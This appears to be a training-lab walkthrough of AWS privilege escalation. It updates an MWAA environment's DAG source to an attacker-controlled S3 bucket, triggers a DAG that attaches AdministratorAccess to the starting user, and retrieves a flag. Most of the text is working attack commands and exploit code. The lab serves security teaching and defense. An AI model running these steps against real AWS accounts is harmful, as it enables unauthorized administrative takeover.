# Guided Walkthrough: Privilege Escalation via airflow:UpdateEnvironment

This scenario demonstrates a privilege escalation vulnerability where a user with `airflow:UpdateEnvironment` permission can exploit an existing Amazon Managed Workflows for Apache Airflow (MWAA) environment that has an administrative execution role attached. Unlike creating a new environment from scratch (mwaa-001), this attack leverages pre-existing infrastructure by updating the environment configuration to change the DAG source bucket to an attacker-controlled S3 bucket.

MWAA environments execute DAGs with the full permissions of their execution role. When an attacker updates the environment's source bucket to point to an S3 bucket they control (which only needs a resource policy allowing the execution role to read from it), they can then use `airflow:CreateCliToken` to obtain a CLI token and trigger any DAG in the attacker's bucket. The malicious DAG executes with administrative credentials, allowing the attacker to attach AdministratorAccess to their starting user or perform any other privileged operation.

This attack is particularly dangerous for four reasons. First, it has a lower permission footprint than mwaa-001: `UpdateEnvironment` doesn't require `iam:PassRole` or VPC provisioning permissions -- only EC2 describe calls and `s3:GetEncryptionConfiguration` for bucket validation. Second, it exploits existing infrastructure, so security teams focused on environment creation alerts may overlook the `UpdateEnvironment` risk entirely. Third, DAGs can be triggered on demand using `airflow:CreateCliToken` and the Airflow CLI API, unlike startup scripts that only run on environment restart. Fourth, environment updates blend in with routine maintenance activity in CloudTrail.

## The Challenge

You start with credentials for `pl-prod-mwaa-002-to-admin-starting-user` retrieved from Terraform outputs. This user can update the existing MWAA environment `pl-prod-mwaa-002-to-admin-env` and obtain CLI tokens for it, but has no IAM permissions of its own. Your goal is to reach the `pl-prod-mwaa-002-to-admin-admin-role`, which has `AdministratorAccess` attached and serves as the execution role for the MWAA environment.

The Terraform deployment has already staged an attacker-controlled S3 bucket (`pl-mwaa-002-attacker-bucket-{account_id}-{suffix}`) with a malicious DAG in a `dags/` prefix. The bucket has a resource policy allowing `pl-prod-mwaa-002-to-admin-admin-role` to read from it, which is the key prerequisite for the exploit.

## Reconnaissance

First, confirm your identity and that you don't have any privileged access yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-mwaa-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- no IAM read permissions
```

Next, check the current state of the target MWAA environment using your helpful `airflow:GetEnvironment` permission:

```bash
aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --output json
```

You'll see it is in `AVAILABLE` status and its `SourceBucketArn` points to the legitimate bucket (`pl-mwaa-002-legitimate-bucket-{account_id}-{suffix}`). Also note the `ExecutionRoleArn` field -- this confirms that `pl-prod-mwaa-002-to-admin-admin-role` is the role all DAGs will execute as.

## Exploitation

The exploit has four steps: redirect the DAG source, wait for the environment to reload, trigger the DAG, and confirm escalation.

**Step 1: Update the environment to use the attacker bucket**

```bash
aws mwaa update-environment \
  --name pl-prod-mwaa-002-to-admin-env \
  --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} \
  --dag-s3-path dags/
```

This redirects where MWAA looks for DAG files. The environment will now enter an `UPDATING` state.

**Step 2: Wait for the environment update to complete (10-30 minutes)**

Poll the environment status until it returns to `AVAILABLE`:

```bash
aws mwaa get-environment \
  --name pl-prod-mwaa-002-to-admin-env \
  --query 'Environment.Status' \
  --output text
```

Once it shows `AVAILABLE`, verify the `SourceBucketArn` now points to your attacker bucket. Then wait an additional 60 seconds for MWAA to sync and parse DAGs from the new location.

**Step 3: Obtain a CLI token and trigger the malicious DAG**

```bash
CLI_TOKEN_RESPONSE=$(aws mwaa create-cli-token \
  --name pl-prod-mwaa-002-to-admin-env \
  --output json)

WEB_SERVER_HOSTNAME=$(echo "$CLI_TOKEN_RESPONSE" | jq -r '.WebServerHostname')
CLI_TOKEN=$(echo "$CLI_TOKEN_RESPONSE" | jq -r '.CliToken')

curl -s --request POST \
  "https://${WEB_SERVER_HOSTNAME}/aws_mwaa/cli" \
  --header "Authorization: Bearer ${CLI_TOKEN}" \
  --header "Content-Type: text/plain" \
  --data-raw "dags trigger privesc_dag" | base64 -d
```

The `privesc_dag` runs as `pl-prod-mwaa-002-to-admin-admin-role` and executes the following Python logic:

```python
import boto3

def escalate_privileges():
    iam = boto3.client('iam')
    user_name = "pl-prod-mwaa-002-to-admin-starting-user"
    policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
    iam.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
    return f"Privilege escalation successful for {user_name}"
```

Wait 30 seconds for the DAG execution to complete and for IAM policy propagation.

## Verification

Confirm that `AdministratorAccess` is now attached to your starting user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-mwaa-002-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
# arn:aws:iam::aws:policy/AdministratorAccess

# Now verify admin access works
aws iam list-users --max-items 3 --output table
# Should succeed -- you now have full administrator access
```

## Capture the Flag

Admin access isn't the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` now attached to your starting user provides implicitly.

The malicious DAG granted `AdministratorAccess` to `pl-prod-mwaa-002-to-admin-starting-user` -- use those same credentials (your original starting-user keys) to read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/mwaa-002-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them -- only the scenario ID in the path changes.

## What Happened

You started with a user that had only two MWAA API permissions and some EC2 describe calls. By redirecting the environment's DAG source to a bucket you controlled, you injected code into a managed service that was already trusted to run as an admin role. The MWAA service retrieved your malicious DAG using the admin execution role's cross-account S3 read, then executed that DAG under the same role -- giving your code unrestricted IAM access.

This technique highlights a broader pattern: any managed compute service (Lambda, ECS, Glue, SageMaker, MWAA) that runs code with a privileged execution role can become a privilege escalation vector when an attacker can influence what code gets executed. The `UpdateEnvironment` permission is often granted for operational reasons -- operators need to update environment configs -- without recognition that it grants the ability to change what code the admin role executes.
